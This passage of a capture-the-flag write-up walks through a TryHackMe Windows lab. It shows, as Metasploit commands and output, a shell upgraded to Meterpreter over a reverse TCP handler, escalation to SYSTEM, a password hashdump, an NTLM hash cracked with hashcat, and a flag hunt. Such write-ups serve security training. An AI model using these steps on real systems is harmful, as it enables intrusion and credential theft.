+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
+</code></pre><p><code>post/multi/manage/shell_to_meterpreter</code></p>
+<h3 id="select-this-use-module_path-show-options-what-option-are-we-required-to-change-all-caps-for-answer">Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)</h3>
+<pre><code>msf6 post(multi/manage/shell_to_meterpreter) &gt; show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+</code></pre><h3 id="set-the-required-option-you-may-need-to-list-all-of-the-sessions-to-find-your-target-here">Set the required option, you may need to list all of the sessions to find your target here.</h3>
+<pre><code>msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information  Connection
+  --  ----  ----               -----------  ----------
+  1         shell x64/windows               10.2.60.96:4444 -&gt; 10.10.233.113:49214 (10.10.233.113)
+
+msf6 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 1
+SESSION =&gt; 1
+</code></pre><p><code>SESSION</code></p>
+<h3 id="run-if-this-doesnt-work-try-completing-the-exploit-from-the-previous-task-once-more">Run! If this doesn&rsquo;t work, try completing the exploit from the previous task once more.</h3>
+<pre><code>msf6 post(multi/manage/shell_to_meterpreter) &gt; exploit
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.2.60.96:4433 
+[*] Post module execution completed
+msf6 post(multi/manage/shell_to_meterpreter) &gt; 
+[*] Sending stage (175174 bytes) to 10.10.233.113
+[*] Meterpreter session 2 opened (10.2.60.96:4433 -&gt; 10.10.233.113:49229) at 2021-02-01 23:34:34 -0500
+[*] Stopping exploit/multi/handler
+</code></pre><p>Note: we could also try
+<code>sessions -u 1</code>
+<code>-u &lt;opt&gt;  Upgrade a shell to a meterpreter session on many platforms</code></p>
+<p>tried though, didnt work</p>
+<h3 id="once-the-meterpreter-shell-conversion-completes-select-that-session-for-use">Once the meterpreter shell conversion completes, select that session for use.</h3>
+<p>run: <code>session 2</code></p>
+<h3 id="verify-that-we-have-escalated-to-nt-authoritysystem-run-getsystem-to-confirm-this-feel-free-to-open-a-dos-shell-via-the-command-shell-and-run-whoami-this-should-return-that-we-are-indeed-system-background-this-shell-afterwards-and-select-our-meterpreter-session-for-usage-again">Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command &lsquo;shell&rsquo; and run &lsquo;whoami&rsquo;. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.</h3>
+<pre><code>meterpreter &gt; shell
+Process 1400 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami 
+whoami
+nt authority\system
+</code></pre><h3 id="list-all-of-the-processes-running-via-the-ps-command-just-because-we-are-system-doesnt-mean-our-process-is-find-a-process-towards-the-bottom-of-this-list-that-is-running-at-nt-authoritysystem-and-write-down-the-process-id-far-left-column">List all of the processes running via the &lsquo;ps&rsquo; command. Just because we are system doesn&rsquo;t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).</h3>
+<p><code>done</code></p>
+<h3 id="migrate-to-this-process-using-the-migrate-process_id-command-where-the-process-id-is-the-one-you-just-wrote-down-in-the-previous-step-this-may-take-several-attempts-migrating-processes-is-not-very-stable-if-this-fails-you-may-need-to-re-run-the-conversion-process-or-reboot-the-machine-and-start-once-again-if-this-happens-try-a-different-process-next-time">Migrate to this process using the &lsquo;migrate PROCESS_ID&rsquo; command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.</h3>
+<p><code>done</code></p>
+<hr>
+<h2 id="4-cracking">4. Cracking</h2>
+<h3 id="within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-passwords-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user">Within our elevated meterpreter shell, run the command &lsquo;hashdump&rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</h3>
+<pre><code>Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</code></pre><p><code>Jon</code></p>
+<h3 id="copy-this-password-hash-to-a-file-and-research-how-to-crack-it-what-is-the-cracked-password">Copy this password hash to a file and research how to crack it. What is the cracked password?</h3>
+<pre><code>❯ hashcat -a 0 -m 1000 crack.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i3-6006U CPU @ 2.00GHz, 2726/2790 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22        
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NTLM
+Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
+Time.Started.....: Tue Feb  2 00:08:23 2021 (6 secs)
+Time.Estimated...: Tue Feb  2 00:08:29 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1705.7 kH/s (0.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 10203136/14344385 (71.13%)
+Rejected.........: 0/10203136 (0.00%)
+Restore.Point....: 10199040/14344385 (71.10%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: alsinah -&gt; alonsouriel
+
+Started: Tue Feb  2 00:07:53 2021
+Stopped: Tue Feb  2 00:08:32 2021
+</code></pre><p><code>alqfna22</code></p>
+<h2 id="5-find-flags">5. Find Flags</h2>
+<pre><code>meterpreter &gt; search -f flag*.txt
+Found 6 results...
+    c:\Documents and Settings\Jon\Documents\flag3.txt (37 bytes)
+    c:\Documents and Settings\Jon\My Documents\flag3.txt (37 bytes)
+    c:\flag1.txt (24 bytes)
+    c:\Users\Jon\Documents\flag3.txt (37 bytes)
+    c:\Users\Jon\My Documents\flag3.txt (37 bytes)
+    c:\Windows\System32\config\flag2.txt (34 bytes)
+</code></pre><h3 id="flag1-this-flag-can-be-found-at-the-system-root">Flag1? This flag can be found at the system root.</h3>
+<p><code>1337</code></p>
+<h3 id="flag2-this-flag-can-be-found-at-the-location-where-passwords-are-stored-within-windows">Flag2? This flag can be found at the location where passwords are stored within Windows.</h3>
+<p><code>1337</code></p>
+<h3 id="flag3-this-flag-can-be-found-in-an-excellent-location-to-loot-after-all-administrators-usually-have-pretty-interesting-things-saved">Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</h3>
+<p><code>1337</code></p>
+<hr>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/windows/">windows</a>
+        
+            <a href="/tags/metasploit/">metasploit</a>
+        
+            <a href="/tags/hash-cracking/">hash-cracking</a>
+        
+    </section>
+
+
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-attackative-directory-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/4WSAwTY.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/4WSAwTY.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Attackative Directory Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-fowsniff-ctf-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/97b218eed9688e9a5cbe136714b86288.jpeg" loading="lazy" data-key="" data-hash="https://tryhackme-images.s3.amazonaws.com/room-icons/97b218eed9688e9a5cbe136714b86288.jpeg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Fowsniff CTF Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-lazy-admin-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/3B6uSkg.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/3B6uSkg.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Lazy Admin Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-relevant-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/AG5H2Sg.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/AG5H2Sg.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Relevant Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-retro-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/Cd3WvVT.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/Cd3WvVT.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Retro Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 Tanishq Chaudhary
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.3.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
